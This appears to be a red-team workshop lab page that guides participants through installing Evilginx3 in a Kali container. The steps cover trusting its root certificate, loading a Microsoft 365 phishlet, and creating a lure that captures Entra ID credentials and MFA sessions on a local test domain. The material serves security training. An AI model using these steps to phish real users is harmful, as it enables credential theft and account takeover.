# Quest 1 - Buckle up!

**[🏠Home](../README.md)** - [ Quest 2 >](quest2.md)

In this tutorial, you will perform basic deployments to set up your environment for the hands-on lab. You will also learn how to install a phishing simulation tool called [EvilGinx](https://help.evilginx.com/docs/intro) to prepare for the next quest.

A common practice for "playing" with hacking tools is to utilize an *isolated environment* instead of your "bare" machine. This can be a container or a virtual machine. This way, you can *keep your main machine clean* and avoid any unintended consequences.

## Guided experience

If you are lucky enough to have signed-up to a guided experience with us like with [this DSAG event](https://dsagnet.de/event/sap-hacker-fur-einen-tag-virtuell), we will be providing pre-configured virtual machines for you.

To get started with one of those,

* Open your RDP client (type `MSTSC` on the search bar on Windows) on your laptop and
* connect to the provided VM using your allocated IP address, user name, and password.

> [!WARNING]
> Corporate firewalls may block RDP connections to unknown destinations. If you are unable to connect, please try a personal device instead.

### Step 1: Start Evilginx3 process

The guided experience uses the container engine podman with the image Kali Linux purpose-built for security and pen-testing.

* Navigate to your VM's desktop and open the terminal (powershell).
* Execute the following commands to start the podman container runtime.

```bash
podman machine init
podman machine set --rootful
podman machine start
```

* Open a parallel session on your terminal (second tab) and execute the following commands to start the Evilginx3 process.

```bash
cd ./docker-kali/
podman build -t my-evilginx-kali:latest .
podman run -it -p 443:443 --name my-evilginx-container my-evilginx-kali:latest
```

This will create the `my-evilginx-container` with a fixed name for static referencing for downstream commands.

Once Evilginx shows up on your terminal as its own process, continue your setup...

> [!TIP]
> The scripts are meant for initial execution. When revisiting the container after a break or similar, run the following from within the container to reach operational status again:
>
> ```bash
> podman start -ia my-evilginx-container
> ```
>
> This command takes you directly to the Evilginx command line interface.

> [!IMPORTANT]
> When restarting the config process, you will need to download the required certificate, and repeat config steps again. Run the command `.\get-crt.ps1` from the git repos in another terminal outside of the EvilGinx process.

### Step 2: Configure Evilginx3

_See the official documentation for reference [here](https://help.evilginx.com/docs/intro)._

Run below commands using the CLI of Evilginx3 to configure the tool.

```bash
config ipv4 127.0.0.1
config domain dsag-red-team.com
```

<p align="center" width="100%">
<img alt="Configure evilginx3" src="assets/quest1/config-evilginx3.png"  width="600">
</p>

> [!NOTE]
> hackers use elusive domains like 'microsofttonline.com' to trick users. Outlook and M365 pick up such attempts, but other email clients may not. Be aware we use a domain that is not registered and only used for this tutorial.

#### Certificate handling

* Get the required root certificate from EvilGinx using the [command](../docker-kali/get-crt.ps1) from your terminal outside of the EvilGinx process. This will copy the generated ca.crt file from the container to your hosting OS into the [docker-kali folder](../docker-kali/).

Use the following podman command to copy the certificate to your local machine.

```bash
podman cp my-evilginx-container:/root/.evilginx/crt/ca.crt ./ca.crt
```

* Add this certificate to the **Trusted Root Certificate Authorities** store of the Current User (double click the file -> Install Certificate). Otherwise, you will get a certificate error when accessing the phishing page!

<p align="center" width="100%">
<img alt="Configure trust store" src="assets/quest1/trust-store.png"  width="600">
</p>

In some cases, you may need to restart your machine for the certificate changes to take effect.

> [!NOTE]
> For Docker, you can use the following command to copy the certificate to your local machine.
>
> ```bash
> .\get-crt.ps1
> ```

### Step 3: Create or retrieve a phishlet for your scenario

We will use a sample phishlet for M365 shared by [Jan Bakker](https://github.com/BakkerJan/evilginx3/blob/main/microsoft365.yaml).

> [!NOTE]
> [The phishlet](../docker-kali/microsoft365.yaml) has already been copied into the container and made available to EvilGinx through folder `/usr/share/evilginx2/phishlets`.

* Verify the M365 phishlet is loaded as expected and execute the command below to see the list of available phishlets.

```bash
phishlets
```

<p align="center" width="100%">
<img alt="new phishlet" src="assets/quest1/new-phishlet.png"  width="600">
</p>

> [!TIP]
> Always check for updates on the phishlets and the EvilGinx tool itself. Things are changing rapidly in the security world!

### Step 4: Prepare your phishing lure

Run below commands using the CLI of Evilginx3 to prepare the phishing lure.

```bash
phishlets hostname microsoft365 dsag-red-team.com
phishlets enable microsoft365 
```

<p align="center" width="100%">
<img alt="prepare phishing lure" src="assets/quest1/prepare-phsishing-lure.png"  width="600">
</p>

#### Enhance your hosts file for local testing

Run below commands using the CLI of Evilginx3 to get the required hosts file entries conveniently.

```bash
phishlets get-hosts microsoft365
```

> [!TIP]
> You may ignore the redundant third line of the output.

<p align="center" width="100%">
<img alt="get-hosts" src="assets/quest1/phshlet-gethost.png"  width="600">
</p>

* Add the output to your hosts file located at `C:\Windows\System32\drivers\etc\hosts`.

> [!IMPORTANT]
> You will need admin rights to edit this file. You may need to execute your editor with elevated rights (Run as Administrator).

<p align="center" width="100%">
<img alt="hosts" src="assets/quest1/hosts.png"  width="600">
</p>

#### Create your phishing lure

```bash
lures create microsoft365
lures get-url 0
```

<p align="center" width="100%">
<img alt="creat fishing lure" src="assets/quest1/create-phishing-lure.png"  width="600">
</p>

* Open the generated URL (https://login.dsag-red-team.com/some-key) in your browser to see the phishing page (see right part of below image for reference).

* Check the Evilginx3 console for the captured output so far ("new visitor has arrived" etc.).

* Finally, supply the Entra ID credentials (+ MFA if configured) to trigger a login on SAP and see the captured data in the Evilginx3 console.

<p align="center" width="100%">
<img alt="new visitor" src="assets/quest1/new-visitor.png"  width="600">
</p>

> [!TIP]
> Hitting `blacklisted ip address` issues? Verify if you executed all configuration steps correctly first. If still doesn't help: run the command `blacklist off` in the Evilginx3 CLI.

## Update the [leaderboard](https://forms.office.com/r/aYH8rh7vp5) with your progress⏱

## Where to next?

**[🏠Home](../README.md)** - [ Quest 2 >](quest2.md)

[🔝](#)
